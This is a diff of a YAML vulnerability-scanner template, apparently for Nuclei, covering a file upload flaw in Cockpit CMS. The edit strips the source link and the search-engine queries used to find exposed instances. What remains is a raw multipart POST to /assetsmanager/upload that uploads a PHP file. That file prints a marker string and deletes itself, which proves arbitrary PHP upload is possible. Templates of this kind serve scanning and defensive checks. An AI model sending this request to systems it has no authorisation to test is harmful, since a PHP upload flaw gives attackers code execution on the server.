@@ -3,12 +3,8 @@ info:
   name: cockpit系统assetsmanager_upload接口 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nx192zlemitczp0g'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nx192zlemitczp0g
-    fofa: Fofa：title="Authenticate Please!" 或 quake：title:"Authenticate Please!" 或 hunter：web.title="Authenticate Please!"
 http:
 - raw:
   - 'POST /assetsmanager/upload HTTP/1.1
@@ -20,8 +16,6 @@ http:
     Cookie: mysession=95524f01e238bf51bb60d77ede3bea92
 
 
-
-
     -----------------------------36D28FBc36bd6feE7Fb3
 
 
@@ -31,8 +25,6 @@ http:
     Content-Type: text/php
 
 
-
-
     <?php echo "dudesite123";unlink(__FILE__);?>
 
 
@@ -40,8 +32,6 @@ http:
 
 
     Content-Disposition: form-data; name="folder"
-
-
 
 
     -----------------------------36D28FBc36bd6feE7Fb3--
